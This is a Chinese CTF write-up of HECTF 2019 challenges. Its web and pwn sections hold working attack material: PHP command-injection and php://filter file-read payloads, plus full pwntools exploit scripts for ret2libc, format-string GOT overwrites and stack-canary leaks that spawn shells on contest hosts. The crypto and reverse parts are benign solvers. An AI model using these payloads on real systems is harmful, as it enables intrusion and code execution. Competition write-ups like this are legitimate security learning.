---
title: '[WriteUp] HECTF WriteUp'
tags:
  - WriteUp
  - HECTF
date: 2019-11-04 16:22:17
categories: WriteUp
abbrlink: 11041
---

## Web

### cmd

有 cmd 和 php_cmd 两个参数，一直在想怎么利用 cmd

后来发现其实直接 php_cmd 就可以了

> ?php_cmd=echo exec("cat /flag.txt");



### 忘记名字了，

用 data:// 协议让用户名为 admin，空数组绕过密码检查，然后 filter 读任意文件的 base64 编码，读到后解码拿到 flag

> ?user=data:text/plain;base64,YWRtaW4=&pass=[]&file=php://filter/read=convert.base64-encode/resource=f1a9.php



## PWN

### easy_pwn

简单的 ret2libc ，leak 出 libc 然后覆盖返回地址拿 shell 

直接上 exp

```python
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *

def leak(func_name, func_addr):
    libc = LibcSearcher(func_name, func_addr)
    libc_base = func_addr - libc.dump(func_name)
    sys_addr = libc_base + libc.dump("system")
    sh_addr = libc_base + libc.dump("str_bin_sh")
    return (sys_addr, sh_addr)

host = "183.129.189.60"
port = 10016
r = remote(host, port)

def run():
    elf = ELF("pwn")

    puts_plt = elf.plt[b"puts"]
    libc_start_main_got = elf.got[b"__libc_start_main"]
    main_addr = elf.symbols[b"main"]
    pop_rdi = 0x4007d3

    r.sendlineafter("name: ", b"hacker")
    payload = b"a"*0x58 + p64(pop_rdi) + p64(libc_start_main_got) + p64(puts_plt) + p64(main_addr)
    r.sendlineafter("game: \n", payload)
    
    leak_addr = u64(r.recv(6).ljust(8, b"\x00"))
    sys_addr, sh_addr = leak("__libc_start_main", leak_addr)

    r.sendlineafter("name: ", b"hacker")
    payload = b"a"*0x58 + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr) + p64(main_addr)
    r.sendlineafter("game: \n", payload)

    r.interactive()

if __name__ == "__main__":
    # context.log_level = "debug"
    run()

```



### middle_pwn

格式化字符串，因为调试的时候看到在调用 printf 之前 rcx 中的值是指向 libc 中偏移 0xf7260 处的，所以直接 leak 出 rcx 就可以算出 libc 和 system

但因为是 64 位的，修改地址比较麻烦，分成三段从小到大修改的，不会用 fmtstr_payload 就只好自己动手了

```python
#!/usr/bin/python3
from pwn import *

host = "183.129.189.60"
port = 10003
r = remote(host, port)

def run():
    printf_got = 0x601028
    rcx_offset = 0xf7260 # 3

    payload = b"%3$16lx."
    r.sendlineafter("Input: \n", payload)

    libc_base = int(r.readuntil(".")[:-1], 16) - rcx_offset
    print("libc_base ==> ", hex(libc_base))
    sys_addr = libc_base + 0x45390

    sys_low_addr = (sys_addr & 0x00000000ffff)
    sys_mid_addr = (sys_addr & 0x0000ffff0000) >> 16
    sys_hig_addr = (sys_addr & 0xffff00000000) >> 32

    print("sys_low_addr ==> ", sys_low_addr)
    print("sys_mid_addr ==> ", sys_mid_addr)
    print("sys_hig_addr ==> ", sys_hig_addr)

    addr_list = [(sys_low_addr, printf_got), (sys_mid_addr, printf_got+2), (sys_hig_addr, printf_got+4)]
    for i in range(len(addr_list)):
        for j in range(i, len(addr_list)):
            if addr_list[j][0] < addr_list[i][0]:
                temp = addr_list[i]
                addr_list[i] = addr_list[j]
                addr_list[j] = temp

    payload = b"%" + bytes(str(addr_list[0][0]), encoding="utf8") + b"c"
    payload += b"%11$hn"
    payload += b"%" + bytes(str(addr_list[1][0]-addr_list[0][0]), encoding="utf8") + b"c"
    payload += b"%12$hn"
    payload += b"%" + bytes(str(addr_list[2][0]-addr_list[1][0]), encoding="utf8") + b"c"
    payload += b"%13$hn"
    payload += b"aa"
    payload += p64(addr_list[0][1])
    payload += p64(addr_list[1][1])
    payload += p64(addr_list[2][1])

    r.sendlineafter("Input: \n", payload)
    r.sendafter("Input: \n", b"/bin/sh\x00")
    r.interactive()

if __name__ == "__main__":
    # context.log_level = "debug"
    run()

```



### wowotou

简单的格式化字符串，并且给出了 v5 的地址，直接改就行了

```python
#!/usr/bin/python3
from pwn import *

#host = "183.129.189.60"
host = "192.168.136.129"
port = 9999
r = remote(host, port)

def run():
    addr = int(r.recvline()[:-1], 16)
    payload = p32(addr) + b"%6$n"
    r.sendlineafter("sorghum?", payload)

    r.interactive()

if __name__ == "__main__":
    # context.log_level = "debug"
    run()

```



### van

还是格式化字符串漏洞，泄漏出 libc 基地址和 代码段基地址 还有 canary 就可以为所欲为了

```python
#!/usr/bin/python3
from pwn import *

host = "183.129.189.60"
port = 10023
r = remote(host, port)

def run():
    payload = b"%4$16lx.%17$16lx.%19$16lx."
    r.sendafter("name:", payload)
    r.sendafter("message:", b"hello")

    code_base = int(r.readuntil(".")[:-1], 16) - 0xbe0
    canary = int(r.recvuntil(".")[:-1], 16)
    libc_base = int(r.recvuntil(".")[:-1], 16) - 0x20830
    print("canary ==> ", hex(canary))
    print("libc_base ==> ", hex(libc_base))

    pop_rdi = code_base + 0xbd3
    sys_addr = libc_base + 0x45390
    sh_addr = libc_base + 0x18cd57

    payload = b"yes\n\x00aaa" + b"a"*0x10 + p64(canary) + p64(0xdeadbeefbabecafe)
    payload += p64(pop_rdi) + p64(sh_addr) + p64(sys_addr) + p64(code_base+0x9f2)
    r.sendafter("me?\n", payload)

    r.interactive()

if __name__ == "__main__":
    # context.log_level = "debug"
    run()

```



### stackpwn

简单的 ret2libc 直接上 exp

```python
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *

def leak(func_name, func_addr):
    libc = LibcSearcher(func_name, func_addr)
    libc_base = func_addr - libc.dump(func_name)
    sys_addr = libc_base + libc.dump("system") # 0x45390
    sh_addr = libc_base + libc.dump("str_bin_sh") # 0x18cd57
    return (sys_addr, sh_addr)

#host = "183.129.189.60"
host = "192.168.136.129"
port = 9999
r = remote(host, port)

def run():
    elf = ELF("stackpwn")

    puts_plt = elf.plt[b"puts"]
    libc_start_main_got = elf.got[b"__libc_start_main"]
    vuln_addr = elf.symbols[b"vuln"]
    pop_rdi = 0x400933

    payload = b"a" * 0x10 + p64(0xdeadbeefbabecafe)
    payload += p64(pop_rdi) + p64(libc_start_main_got) + p64(puts_plt) + p64(vuln_addr)
    r.sendlineafter("instructions...\n", payload)

    leak_addr = u64(r.recv(6).ljust(8, b"\x00"))
    sys_addr, sh_addr = leak("__libc_start_main", leak_addr)

    payload = b"a" * 0x10 + p64(0xdeadbeefbabecafe)
    payload += p64(pop_rdi) + p64(sh_addr) + p64(sys_addr) + p64(vuln_addr)
    r.sendlineafter("instructions...\n", payload)

    r.interactive()

if __name__ == "__main__":
    # context.log_level = "debug"
    run()

```



### stackpwn2

先格式化字符串 leak 出 canary 再 ret2libc 就可以了，很简单

```python
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *

def leak(func_name, func_addr):
    libc = LibcSearcher(func_name, func_addr)
    libc_base = func_addr - libc.dump(func_name)
    sys_addr = libc_base + libc.dump("system")
    sh_addr = libc_base + libc.dump("str_bin_sh")
    return (sys_addr, sh_addr)

host = "183.129.189.60"
port = 10000
r = remote(host, port)

def run():
    elf = ELF("stackpwn2")

    libc_start_main_got = elf.got[b"__libc_start_main"]
    puts_plt = elf.plt[b"puts"]
    func2_addr = elf.symbols[b"func2"]
    pop_rdi = 0x4009c3

    payload = b"%9$16lx"
    r.sendlineafter("system...\n", payload)

    canary = int(r.recvuntil("What")[:-4], 16)
    print("canary ==> ", hex(canary))

    payload = b"a"*0x18 + p64(canary) + p64(0xdeadbeefbabecafe)
    payload += p64(pop_rdi) + p64(libc_start_main_got) + p64(puts_plt) + p64(func2_addr)
    r.sendafter("to do?\n", payload)

    leak_addr = u64(r.recv(6).ljust(8, b"\x00"))
    sys_addr, sh_addr = leak("__libc_start_main", leak_addr)

    payload = b"a"*0x18 + p64(canary) + p64(0xdeadbeefbabecafe)
    payload += p64(pop_rdi) + p64(sh_addr) + p64(sys_addr) + p64(func2_addr)
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    # context.log_level = "debug"
    run()

```



## Reverse

### helloRE

输入字符串之后，简单处理然后比较，解密后似乎是 base64，根据群主提示第九位字符是 Z 改了之后解码得到 flag

```go
package main

import (
	"encoding/base64"
	"fmt"
)

func main() {
	var (
		src  = []byte("aY9)Z(?|ZX9xOC9z_i9eOYCw")
		temp byte
	)
	for i := 0; i < len(src); i++ {
		temp = src[i]
		if temp >= 40 && temp < 48 {
			temp += 8
		}
		if temp >= 62 && temp <= 73 {
			temp += 3
		}
		if temp >= 79 && temp < 92 {
			temp -= 2
		}
		if temp >= 93 && temp <= 107 {
			temp += 4
		}
		if temp >= 115 && temp <= 125 {
			temp -= 3
		}
		if temp < 38 && temp > 29 {
			temp += 1
		}
		src[i] = temp
	}
	src[8] = 'Z'
	data, _ := base64.StdEncoding.DecodeString(string(src))
	fmt.Println(string(data)) // you_@re_n0_prob1am
}

```



## Crypto

### base64

这个很简答，一直解码就行了，这里给出 golang 的脚本

```go
package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
)

func main() {
	data, err := ioutil.ReadFile("./base64/flag.txt")
	if err != nil {
		panic(err)
	}

	for string(data[:4]) != "flag" {
		data, err = base64.StdEncoding.DecodeString(string(data))
		if err != nil {
			panic(err)
		}
	}
	fmt.Println(string(data)) // flag{c03781ba-81e9-48a6-afa4-037ee7
}

```



### scp_log

这个是简单的 rsa ，把两个 n 都分解出来就行了，放到在线分解即可

```python
from Crypto.Util.number import long_to_bytes, inverse

n = 264875192370170517892762732090900080619
c = 47819707739737226624777301005156120764
e = 65537

p = 14551317285762034343
q = 18202832579930191133

phi_n = (p-1)*(q-1)
d = inverse(e, phi_n)
m = pow(c, d, n)
print(long_to_bytes(m)) # flag{1721f85a-85

n = 106158821499931842590118125106329600437515392507293920805755481915579329343519
c = 92745720427756739394340901560209310176270205381847603138854431221975461027052

p = 320497037861156634156854662131884925503
q = 331231833555732222509315290877898160673

phi_n = (p-1)*(q-1)
d = inverse(e, phi_n)
m = pow(c, d, n)
print(long_to_bytes(m)) # ed-4769-8faa-4e15baaaa853}

```



### RC4?

RC4 加密，把 256 改成 8，很简单，这里给出 golang 脚本

```go
package main

import "fmt"

func main() {
	sbox := []int{7, 6, 2, 5, 1, 0, 3, 4}
	mes := []byte("kfggtb}thiu[jtXU@2Xeu{uu|")

	i, j := 0, 0
	for l := 0; l < len(mes); l++ {
		i = (i + 1) % 8
		j = (j + sbox[i]) % 8
		temp := sbox[i]
		sbox[i] = sbox[j]
		sbox[j] = temp
		mes[l] ^= byte(sbox[(sbox[i]+sbox[j])%8])
	}

	fmt.Println(string(mes)) // hebctf{this_is_RC4_crypt}
}

```



## 注

还有部分可能忘记了，只可惜在下没有赛后保存题目的习惯，以后注意 (逃

